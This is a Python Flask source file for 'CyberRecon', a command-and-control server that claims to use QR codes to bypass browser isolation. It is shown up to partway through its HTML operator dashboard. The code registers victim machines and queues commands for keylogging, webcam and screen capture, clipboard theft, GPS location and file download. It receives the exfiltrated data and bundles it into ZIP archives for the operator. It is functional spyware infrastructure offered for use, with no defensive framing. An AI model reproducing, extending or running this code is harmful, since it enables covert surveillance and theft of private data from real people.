"""
CyberRecon C2 Server (Flask + QR Encoder + Premium Dashboard)
Implements Mandiant QR C2 Bypass for Browser Isolation
Premium GUI with smooth animations and modern design
"""

import base64
import io
import json
import time
import uuid
import threading
import zipfile
from datetime import datetime
from flask import Flask, jsonify, send_file, request, render_template_string
from io import BytesIO
import qrcode
from qrcode.constants import ERROR_CORRECT_H

app = Flask(__name__)

# In-memory storage
victims = {}
victims_lock = threading.Lock()

# Command templates
COMMAND_TEMPLATES = {
    "whoami": {"cmd": "whoami", "args": [], "type": "system"},
    "screenshot": {"cmd": "screenshot", "args": [], "type": "exfil"},
    "webcam_snap": {"cmd": "webcam_capture", "args": [], "type": "exfil"},
    "keylog_start": {"cmd": "keylogger", "args": ["start"], "type": "persist"},
    "keylog_stop": {"cmd": "keylogger", "args": ["stop"], "type": "persist"},
    "clipboard_get": {"cmd": "clipboard_steal", "args": [], "type": "exfil"},
    "download": {"cmd": "file_download", "args": ["C:/Users/Admin/secret.pdf"], "type": "exfil"},
    "gps_locate": {"cmd": "gps_location", "args": [], "type": "exfil"},
    "process_list": {"cmd": "process_list", "args": [], "type": "system"},
    "system_info": {"cmd": "system_info", "args": [], "type": "system"},
    "persist": {"cmd": "persist", "args": [], "type": "persist"},
    "self_destruct": {"cmd": "self_destruct", "args": [], "type": "stealth"},
    "shell": {"cmd": "shell", "args": ["whoami"], "type": "system"},
    "list_files": {"cmd": "list_files", "args": ["C:/Users"], "type": "system"}
}

OUTPUT_TYPES = ("whoami", "system_info", "process_list", "clipboard", "shell", "file", "list_files")

# ======== QR ENCODER ========

def encode_command_to_qr(command_dict: dict, size: int = 400) -> BytesIO:
    payload = base64.b64encode(json.dumps(command_dict).encode()).decode()
    if len(payload) > 500:
        payload = payload[:500]
    qr = qrcode.QRCode(version=None, error_correction=ERROR_CORRECT_H, box_size=10, border=4)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img = img.resize((size, size))
    buf = BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf

# ======== REST API ========

@app.route("/")
def index():
    return jsonify({
        "status": "CyberRecon C2 Server Active",
        "mode": "QR-Visual-Bypass",
        "reference": "Mandiant (2024)",
        "victims_online": len(victims),
    })

@app.route("/register", methods=["POST"])
def register_victim():
    data = request.get_json() or {}
    victim_id = str(uuid.uuid4())[:8]
    with victims_lock:
        victims[victim_id] = {
            "id": victim_id,
            "ip": request.remote_addr,
            "hostname": data.get("hostname", "unknown"),
            "os": data.get("os", "unknown"),
            "user": data.get("user", "unknown"),
            "registered_at": datetime.now().isoformat(),
            "last_seen": time.time(),
            "command_queue": [],
            "exfil_buffer": [],
            "screenshots": [],
            "webcam_snaps": [],
            "keystrokes": [],
            "locations": [],
            "files": [],
            "outputs": [],
            "status": "online"
        }
    print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
    return jsonify({"victim_id": victim_id, "status": "registered"})

@app.route("/qr/<victim_id>")
def get_qr_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        if victim["command_queue"]:
            cmd = victim["command_queue"].pop(0)
        else:
            cmd = {"cmd": "heartbeat", "ts": time.time(), "id": str(uuid.uuid4())[:6]}
    buf = encode_command_to_qr(cmd)
    return send_file(buf, mimetype="image/png")

@app.route("/command/<victim_id>", methods=["POST"])
def queue_command(victim_id):
    data = request.get_json() or {}
    cmd_name = data.get("command", "whoami")
    custom_args = data.get("args", [])
    if cmd_name not in COMMAND_TEMPLATES:
        return jsonify({"error": f"Unknown command: {cmd_name}"}), 400
    cmd = COMMAND_TEMPLATES[cmd_name].copy()
    if custom_args:
        cmd["args"] = custom_args
    cmd["ts"] = time.time()
    cmd["id"] = str(uuid.uuid4())[:6]
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        victims[victim_id]["command_queue"].append(cmd)
    print(f"[+] Command queued for {victim_id}: {cmd_name}")
    return jsonify({"status": "queued", "command": cmd})

@app.route("/exfil/<victim_id>", methods=["POST"])
def receive_exfil(victim_id):
    data = request.get_json() or {}
    data_type = data.get("type", "unknown")
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        entry = {
            "ts": datetime.now().isoformat(),
            "type": data_type,
            "size": len(str(data.get("data", ""))),
            "data": data.get("data", "")
        }
        victims[victim_id]["exfil_buffer"].append(entry)
        if data_type == "screenshot":
            victims[victim_id]["screenshots"].append(entry)
        elif data_type == "webcam":
            victims[victim_id]["webcam_snaps"].append(entry)
        elif data_type == "keystrokes":
            victims[victim_id]["keystrokes"].append(entry)
        elif data_type == "gps":
            victims[victim_id]["locations"].append(entry)
        elif data_type == "file":
            victims[victim_id]["files"].append(entry)
        if data_type in OUTPUT_TYPES:
            victims[victim_id]["outputs"].append(entry)
    print(f"[EXFIL] {data_type} from {victim_id} ({entry['size']} bytes)")
    return jsonify({"status": "received"})

@app.route("/victims")
def list_victims():
    with victims_lock:
        return jsonify({
            "count": len(victims),
            "victims": [
                {
                    "id": v["id"],
                    "ip": v["ip"],
                    "hostname": v["hostname"],
                    "os": v["os"],
                    "user": v["user"],
                    "last_seen": v["last_seen"],
                    "pending_commands": len(v["command_queue"]),
                    "exfil_count": len(v["exfil_buffer"]),
                    "status": v["status"],
                    "screenshots_count": len(v["screenshots"]),
                    "webcam_count": len(v["webcam_snaps"]),
                    "keystrokes_count": len(v["keystrokes"]),
                    "locations_count": len(v["locations"]),
                    "outputs_count": len(v["outputs"])
                }
                for v in victims.values()
            ]
        })

@app.route("/victim/<victim_id>")
def get_victim(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "id": v["id"],
            "ip": v["ip"],
            "hostname": v["hostname"],
            "os": v["os"],
            "user": v["user"],
            "registered_at": v["registered_at"],
            "last_seen": v["last_seen"],
            "status": v["status"],
            "screenshots_count": len(v["screenshots"]),
            "webcam_count": len(v["webcam_snaps"]),
            "keystrokes_count": len(v["keystrokes"]),
            "locations_count": len(v["locations"]),
            "files_count": len(v["files"]),
            "outputs_count": len(v["outputs"]),
            "pending_commands": len(v["command_queue"])
        })

@app.route("/exfil-data/<victim_id>")
def get_exfil_data(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]
        return jsonify({
            "screenshots": v["screenshots"][-5:],
            "webcam": v["webcam_snaps"][-5:],
            "keystrokes": v["keystrokes"][-20:],
            "locations": v["locations"][-3:],
            "outputs": v["outputs"][-10:]
        })

@app.route("/poll/<victim_id>")
def poll_command(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not registered"}), 404
        victim = victims[victim_id]
        victim["last_seen"] = time.time()
        victim["status"] = "online"
        if victim["command_queue"]:
            cmd = victim["command_queue"].pop(0)
            return jsonify(cmd)
        else:
            return jsonify({"cmd": "heartbeat", "ts": time.time(), "id": str(uuid.uuid4())[:6]})

@app.route("/check")
def health_check():
    return jsonify({"status": "ok", "timestamp": time.time()})

# ======== BULK DOWNLOAD ENDPOINT ========

@app.route("/download-all/<victim_id>")
def download_all_data(victim_id):
    """Package all exfiltrated data as a ZIP file."""
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        v = victims[victim_id]

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            victim_info = {
                "id": v["id"],
                "ip": v["ip"],
                "hostname": v["hostname"],
                "os": v["os"],
                "user": v["user"],
                "registered_at": v["registered_at"],
                "last_seen": v["last_seen"],
                "screenshot_count": len(v["screenshots"]),
                "webcam_count": len(v["webcam_snaps"]),
                "keystrokes_count": len(v["keystrokes"]),
                "locations_count": len(v["locations"]),
                "outputs_count": len(v["outputs"])
            }
            zf.writestr("victim_info.json", json.dumps(victim_info, indent=2))

            for i, s in enumerate(v["screenshots"]):
                try:
                    img_bytes = base64.b64decode(s["data"])
                    ext = "png" if img_bytes[:4] == b"\x89PNG" else "jpg"
                    zf.writestr(f"screenshots/screenshot_{i:04d}.{ext}", img_bytes)
                except Exception:
                    pass

            for i, w in enumerate(v["webcam_snaps"]):
                try:
                    img_bytes = base64.b64decode(w["data"])
                    zf.writestr(f"webcam/webcam_{i:04d}.jpg", img_bytes)
                except Exception:
                    pass

            if v["keystrokes"]:
                keystrokes_text = ""
                for k in v["keystrokes"]:
                    keystrokes_text += f"[{k['ts']}] {k['data']}\n"
                zf.writestr("keystrokes/keylog.txt", keystrokes_text)

            if v["locations"]:
                locations_data = [{"ts": l["ts"], "data": l["data"]} for l in v["locations"]]
                zf.writestr("locations/gps_history.json", json.dumps(locations_data, indent=2))

            if v["outputs"]:
                outputs_text = ""
                for o in v["outputs"]:
                    outputs_text += f"\n{'='*60}\n"
                    outputs_text += f"[{o['ts']}] {o['type'].upper()}\n"
                    outputs_text += f"{'='*60}\n"
                    if isinstance(o["data"], dict):
                        outputs_text += json.dumps(o["data"], indent=2)
                    else:
                        outputs_text += str(o["data"])
                    outputs_text += "\n"
                zf.writestr("outputs/command_output.txt", outputs_text)

            for i, f in enumerate(v["files"]):
                try:
                    file_bytes = base64.b64decode(f["data"])
                    zf.writestr(f"files/downloaded_file_{i}.bin", file_bytes)
                except Exception:
                    pass

        zip_buffer.seek(0)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"CyberRecon_{v['hostname']}_{victim_id}_{timestamp}.zip"

    return send_file(
        zip_buffer,
        mimetype="application/zip",
        as_attachment=True,
        download_name=filename
    )

# ======== IMAGE SERVING ========

def _serve_b64_image(img_data, mimetype):
    if not img_data:
        return jsonify({"error": "Empty image data"}), 404
    try:
        img_bytes = base64.b64decode(img_data)
        return send_file(BytesIO(img_bytes), mimetype=mimetype)
    except Exception as e:
        return jsonify({"error": f"Invalid image data: {e}"}), 400

@app.route("/latest_screenshot/<victim_id>")
def get_latest_screenshot(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        screenshots = victims[victim_id].get("screenshots", [])
        if not screenshots:
            return jsonify({"error": "No screenshots yet"}), 404
        img_data = screenshots[-1].get("data", "")
    return _serve_b64_image(img_data, "image/png")

@app.route("/latest_webcam/<victim_id>")
def get_latest_webcam(victim_id):
    with victims_lock:
        if victim_id not in victims:
            return jsonify({"error": "Victim not found"}), 404
        snaps = victims[victim_id].get("webcam_snaps", [])
        if not snaps:
            return jsonify({"error": "No webcam captures yet"}), 404
        img_data = snaps[-1].get("data", "")
    return _serve_b64_image(img_data, "image/jpeg")

# ======== PREMIUM DASHBOARD ========

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberRecon • Command Center</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #06080f;
            --bg-secondary: #0d1220;
            --bg-tertiary: #131a2e;
            --bg-card: #0f1524;
            --border: #1a2440;
            --border-hover: #2a3a60;
            --text-primary: #e8edf7;
            --text-secondary: #7a8ba8;
            --text-muted: #4a5a78;
            --accent: #00d4ff;
            --accent-glow: rgba(0, 212, 255, 0.4);
            --success: #00ff88;
            --success-glow: rgba(0, 255, 136, 0.3);
            --warning: #ffb340;
            --danger: #ff3b5c;
            --gradient-1: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
            --gradient-2: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
            --shadow-glow: 0 0 20px var(--accent-glow);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            background-image:
                radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.06) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 255, 136, 0.04) 0%, transparent 50%);
            background-attachment: fixed;
        }

        /* Animated background grid */
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image:
                linear-gradient(rgba(0, 212, 255, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 212, 255, 0.02) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: 0;
            animation: gridShift 20s linear infinite;
        }

        @keyframes gridShift {
            0% { background-position: 0 0; }
            100% { background-position: 50px 50px; }
        }

        /* HEADER */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            background: rgba(13, 18, 32, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            padding: 14px 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            animation: slideDown 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 36px; height: 36px;
            background: var(--gradient-1);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: var(--shadow-glow);
            animation: pulseGlow 3s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 20px var(--accent-glow); }
            50% { box-shadow: 0 0 30px var(--accent-glow), 0 0 40px var(--accent-glow); }
        }

        .logo-text {
            font-size: 18px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: var(--gradient-1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .logo-subtitle {
            font-size: 11px;
            color: var(--text-muted);
            font-weight: 400;
            letter-spacing: 0.5px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 6px 14px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            color: var(--success);
            letter-spacing: 0.5px;
            animation: pulse 2s ease-in-out infinite;
        }

        .status-dot {
            width: 6px; height: 6px;
            background: var(--success);
            border-radius: 50%;
            box-shadow: 0 0 10px var(--success);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .clock {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: var(--text-secondary);
            padding: 6px 12px;
            background: var(--bg-tertiary);
            border-radius: 8px;
            border: 1px solid var(--border);
        }

        /* CONTAINER */
        .container {
            position: relative;
            z-index: 1;
            padding: 24px 32px;
            max-width: 1600px;
            margin: 0 auto;
        }

        /* METRICS GRID */
        .metrics {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 16px;
            margin-bottom: 24px;
        }

        .metric-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 20px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            animation: fadeInUp 0.5s cubic-bezier(0.4, 0, 0.2, 1) backwards;
        }

        .metric-card:nth-child(1) { animation-delay: 0.05s; }
        .metric-card:nth-child(2) { animation-delay: 0.1s; }
        .metric-card:nth-child(3) { animation-delay: 0.15s; }
        .metric-card:nth-child(4) { animation-delay: 0.2s; }
        .metric-card:nth-child(5) { animation-delay: 0.25s; }

        @keyframes fadeInUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .metric-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: var(--gradient-1);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .metric-card:hover::before { opacity: 1; }
        .metric-card:hover {
            border-color: var(--border-hover);
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .metric-value {
            font-size: 32px;
            font-weight: 800;
            color: var(--success);
            letter-spacing: -1px;
            line-height: 1;
            font-variant-numeric: tabular-nums;
            transition: all 0.3s;
        }

        .metric-card:hover .metric-value {
            text-shadow: 0 0 20px var(--success-glow);
        }

        .metric-label {
            font-size: 11px;
            color: var(--text-muted);
            margin-top: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        /* MAIN GRID */
        .grid {
            display: grid;
            grid-template-columns: 340px 1fr;
            gap: 20px;
        }

        /* SIDEBAR */
        .sidebar {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            animation: fadeInLeft 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        @keyframes fadeInLeft {
            from { transform: translateX(-20px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .sidebar h3 {
            color: var(--accent);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
        }

        /* COMMAND BAR */
        .command-bar {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
        }

        .command-bar select {
            flex: 1;
            padding: 10px 12px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            outline: none;
            transition: all 0.2s;
        }

        .command-bar select:hover,
        .command-bar select:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(0, 212, 255, 0.1);
        }

        .command-bar button {
            padding: 10px 20px;
            background: var(--gradient-1);
            border: none;
            border-radius: 8px;
            color: #06080f;
            font-family: inherit;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
            letter-spacing: 0.3px;
        }

        .command-bar button:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 20px var(--accent-glow);
        }

        .command-bar button:active {
            transform: translateY(0);
        }

        /* DOWNLOAD BUTTON */
        .download-btn {
            width: 100%;
            padding: 12px 20px;
            margin-top: 10px;
            background: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
            border: none;
            border-radius: 8px;
            color: #06080f;
            font-family: inherit;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .download-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
        }

        .download-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .download-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            background: var(--bg-tertiary);
            color: var(--text-muted);
        }

        .download-btn.downloading {
            pointer-events: none;
            opacity: 0.7;
        }

        .download-btn.downloading::after {
            content: '';
            width: 14px;
            height: 14px;
            border: 2px solid rgba(0,0,0,0.3);
            border-top-color: #06080f;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* VICTIM LIST */
        .victim-list {
            flex: 1;
            overflow-y: auto;
            max-height: 500px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .victim-list::-webkit-scrollbar {
            width: 4px;
        }
        .victim-list::-webkit-scrollbar-track {
            background: transparent;
        }
        .victim-list::-webkit-scrollbar-thumb {
            background: var(--border-hover);
            border-radius: 2px;
        }

        .victim-card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 14px;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            animation: fadeInUp 0.3s ease-out;
        }

        .victim-card::before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 3px;
            background: var(--success);
            opacity: 0;
            transition: opacity 0.2s;
        }

        .victim-card:hover {
            border-color: var(--border-hover);
            transform: translateX(4px);
            background: var(--bg-card);
        }

        .victim-card:hover::before { opacity: 1; }

        .victim-card.active {
            border-color: var(--success);
            background: rgba(0, 255, 136, 0.06);
            box-shadow: 0 0 0 1px var(--success), 0 0 20px rgba(0, 255, 136, 0.15);
        }

        .victim-card.active::before { opacity: 1; }

        .victim-card h4 {
            color: var(--text-primary);
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .victim-card p {
            color: var(--text-secondary);
            font-size: 11px;
            margin-top: 3px;
            font-family: 'JetBrains Mono', monospace;
        }

        .victim-card .status-online {
            color: var(--success);
            font-weight: 600;
        }

        .victim-card .status-offline {
            color: var(--danger);
            font-weight: 600;
        }

        /* MAIN PANEL */
        .main-panel {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        .panel {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 20px;
            transition: all 0.3s;
            animation: fadeInUp 0.5s cubic-bezier(0.4, 0, 0.2, 1) backwards;
            display: flex;
            flex-direction: column;
        }

        .panel:nth-child(1) { animation-delay: 0.1s; }
        .panel:nth-child(2) { animation-delay: 0.15s; }
        .panel:nth-child(3) { animation-delay: 0.2s; }
        .panel:nth-child(4) { animation-delay: 0.25s; }
        .panel:nth-child(5) { animation-delay: 0.3s; }
        .panel:nth-child(6) { animation-delay: 0.35s; }

        .panel:hover {
            border-color: var(--border-hover);
        }

        .panel h3 {
            color: var(--accent);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .panel-content {
            background: var(--bg-secondary);
            border-radius: 10px;
            flex: 1;
            min-height: 220px;
            overflow: hidden;
            position: relative;
            transition: all 0.3s;
        }

        .panel-content img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 8px;
            animation: imageFadeIn 0.4s ease-out;
        }

        @keyframes imageFadeIn {
            from { opacity: 0; transform: scale(0.98); }
            to { opacity: 1; transform: scale(1); }
        }

        .panel-content pre {
            padding: 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--text-secondary);
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            line-height: 1.6;
        }

        .panel-content pre::-webkit-scrollbar {
            width: 4px;
        }
        .panel-content pre::-webkit-scrollbar-thumb {
            background: var(--border-hover);
            border-radius: 2px;
        }

        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 220px;
            color: var(--text-muted);
            font-size: 12px;
            gap: 8px;
        }

        .empty-state-icon {
            font-size: 32px;
            opacity: 0.3;
        }

        /* GPS PANEL */
        .gps-info {
            padding: 14px;
        }

        .gps-coords {
            font-family: 'JetBrains Mono', monospace;
            font-size: 22px;
            font-weight: 700;
            color: var(--success);
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .gps-meta {
            color: var(--text-secondary);
            font-size: 12px;
            margin-bottom: 14px;
        }

        .gps-details {
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid var(--border);
            font-size: 11px;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .gps-details span { color: var(--text-primary); }

        /* LOG PANEL */
        .log-panel {
            grid-column: 1 / -1;
        }

        .log-panel .panel-content {
            max-height: 200px;
            overflow-y: auto;
        }

        .log-entry {
            padding: 8px 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            border-bottom: 1px solid var(--border);
            display: flex;
            gap: 10px;
            animation: logSlideIn 0.3s ease-out;
        }

        @keyframes logSlideIn {
            from { transform: translateX(-10px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .log-entry .log-time {
            color: var(--text-muted);
            flex-shrink: 0;
        }

        .log-entry.info { color: var(--accent); }
        .log-entry.success { color: var(--success); }
        .log-entry.warning { color: var(--warning); }
        .log-entry.error { color: var(--danger); }

        /* NOTIFICATION */
        .notification {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: var(--bg-card);
            border: 1px solid var(--success);
            border-radius: 12px;
            padding: 16px 20px;
            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            z-index: 1000;
            animation: slideInRight 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            max-width: 400px;
        }

        @keyframes slideInRight {
            from { transform: translateX(120%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .notification.hide {
            animation: slideOutRight 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(120%); opacity: 0; }
        }

        .notification-icon {
            font-size: 20px;
        }

        .notification-content {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .notification-title {
            color: var(--success);
            font-weight: 600;
            font-size: 12px;
        }

        .notification-message {
            color: var(--text-secondary);
            font-size: 11px;
        }

        /* SMOOTH SCROLL */
        * {
            scroll-behavior: smooth;
        }

        /* RESPONSIVE */
        @media (max-width: 1200px) {
            .metrics { grid-template-columns: repeat(3, 1fr); }
            .grid { grid-template-columns: 1fr; }
            .main-panel { grid-template-columns: 1fr; }
        }

        @media (max-width: 768px) {
            .metrics { grid-template-columns: repeat(2, 1fr); }
            .container { padding: 16px; }
            .header { padding: 12px 16px; }
        }

        /* RIPPLE EFFECT */
        .ripple {
            position: relative;
            overflow: hidden;
        }

        .ripple::after {
            content: '';
            position: absolute;
            top: 50%; left: 50%;
            width: 5px; height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }

        .ripple:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }

        @keyframes ripple {
            0% { transform: scale(0, 0); opacity: 1; }
            20% { transform: scale(25, 25); opacity: 1; }
            100% { opacity: 0; transform: scale(40, 40); }
        }

        /* TOAST ANIMATION */
        @keyframes toastIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- HEADER -->
    <div class="header">
        <div class="logo">
            <div class="logo-icon">⚡</div>
            <div>
                <div class="logo-text">CyberRecon</div>
                <div class="logo-subtitle">MANDIANT QR C2 • BROWSER ISOLATION BYPASS</div>
            </div>
        </div>
        <div class="header-right">
            <div class="clock" id="clock">--:--:--</div>
            <div class="status-badge">
                <span class="status-dot"></span>
                LIVE
            </div>
        </div>
    </div>

    <!-- MAIN CONTAINER -->
    <div class="container">
        <!-- METRICS -->
        <div class="metrics">
            <div class="metric-card">
                <div class="metric-value" id="metric-victims">0</div>
                <div class="metric-label">Active Victims</div>
            </div>
            <div class="metric-card">
                <div class="metric-value" id="metric-exfil">0</div>
                <div class="metric-label">Exfil Events</div>
            </div>
            <div class="metric-card">
                <div class="metric-value" id="metric-screenshots">0</div>
                <div class="metric-label">Screenshots</div>
            </div>
            <div class="metric-card">
                <div class="metric-value" id="metric-webcam">0</div>
                <div class="metric-label">Webcam Captures</div>
            </div>
            <div class="metric-card">
                <div class="metric-value" id="metric-keystrokes">0</div>
                <div class="metric-label">Keystroke Chunks</div>
            </div>
        </div>

        <!-- MAIN GRID -->
        <div class="grid">
            <!-- SIDEBAR -->
            <div class="sidebar">
                <h3>🎯 TARGET VICTIMS</h3>
                <div class="command-bar">
                    <select id="cmd-select">
                        <option value="screenshot">📸 Screenshot</option>
                        <option value="webcam_snap">📷 Webcam</option>
                        <option value="keylog_start">⌨️ Keylog Start</option>
                        <option value="keylog_stop">⌨️ Keylog Stop</option>
                        <option value="clipboard_get">📋 Clipboard</option>
                        <option value="gps_locate">📍 GPS Locate</option>
                        <option value="process_list">⚙️ Process List</option>
                        <option value="system_info">💻 System Info</option>
                        <option value="whoami">👤 Whoami</option>
                        <option value="self_destruct">💀 Self Destruct</option>
                    </select>
                    <button onclick="sendCommand()" class="ripple">SEND</button>
                </div>
                <button onclick="downloadAllData()" class="download-btn" id="download-btn" disabled>
                    ⬇ DOWNLOAD ALL DATA
                </button>
                <div class="victim-list" id="victim-list">
                    <div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
                        <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>
                        Waiting for victims...
                    </div>
                </div>
            </div>

            <!-- MAIN PANEL -->
            <div class="main-panel">
                <!-- SCREENSHOTS -->
                <div class="panel">
                    <h3>📸 SCREENSHOTS</h3>
                    <div class="panel-content" id="screenshots-panel">
                        <div class="empty-state">
                            <div class="empty-state-icon">📸</div>
                            No screenshots yet
                        </div>
                    </div>
                </div>

                <!-- WEBCAM -->
                <div class="panel">
                    <h3>📷 WEBCAM</h3>
                    <div class="panel-content" id="webcam-panel">
                        <div class="empty-state">
                            <div class="empty-state-icon">📷</div>
                            No webcam captures yet
                        </div>
                    </div>
